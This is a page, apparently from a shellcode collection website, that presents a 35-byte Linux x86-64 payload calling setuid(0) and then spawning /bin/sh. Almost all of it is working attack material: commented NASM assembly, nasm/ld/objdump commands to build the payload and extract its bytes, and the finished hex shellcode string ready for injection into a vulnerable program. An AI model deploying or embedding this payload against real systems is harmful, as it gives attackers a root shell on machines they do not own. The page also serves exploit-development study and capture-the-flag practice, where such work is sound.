---
layout: default
title: setuid(0); execve("/bin/sh", NULL, 0) - Set UID to 0 and spawn shell
permalink: /shellcode/asm-13.html
os: Linux
arch: Intel x86-64
length: 35
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor rdi, rdi			; null rdi (0)
	mov al, 0x69			; move setuid syscall number into al (rax)
	syscall				; call setuid

	xor rdx, rdx			; null rdx

	push rdx			; push null terminator
	mov rax, 0x68732f2f6e69622f	; move "/bin//sh" into rax
	push rax			; push "/bin//sh"
	mov rdi, rsp			; move pointer to "/bin//sh" into rdi

	push rdx			; push null terminator
	push rdi			; push pointer to "/bin//sh"
	mov rsi, rsp			; moves pointer to array {"/bin//sh", 0} into rsi

	push 0x3b			; push execve syscall number
	pop rax				; pop execve syscall number into rax
	syscall				; call execve
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05
```